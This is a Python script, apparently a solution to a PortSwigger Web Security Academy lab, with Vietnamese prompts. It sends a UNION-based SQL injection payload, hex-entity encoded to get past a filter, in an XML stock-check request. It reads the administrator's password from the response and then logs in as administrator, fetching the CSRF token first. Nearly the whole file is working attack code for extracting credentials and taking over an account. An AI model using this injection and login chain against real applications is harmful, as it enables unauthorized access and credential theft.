import requests
from bs4 import BeautifulSoup
import re

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

payload = "1 UNION SELECT CONCAT(username, '~', password) FROM users"
encoded_payload = ''.join([f'&#x{ord(c):x};' for c in payload])

# Gửi payload XML
url = f"{base_url}/product/stock"
headers = {"Content-Type": "application/xml"}
xml_data = f"""<?xml version="1.0"?>
<stockCheck>
  <productId>1</productId>
  <storeId>{encoded_payload}</storeId>
</stockCheck>"""

print("[!] Gửi payload để đọc dữ liệu từ bảng users...")

res = requests.post(url, headers=headers, data=xml_data)

admin_password = None
for line in res.text.splitlines():
    if "administrator~" in line:
        admin_password = line.split("~", 1)[1].split("<")[0]
        break

if not admin_password:
    print("[-] Không tìm được mật khẩu administrator")
    exit()
else:
    print(f"[+] Mật khẩu administrator: {admin_password}")

print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": admin_password
}
response = session.post(login_url, data=data)

if (response.status_code == 200 and "Log out" in response.text):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")
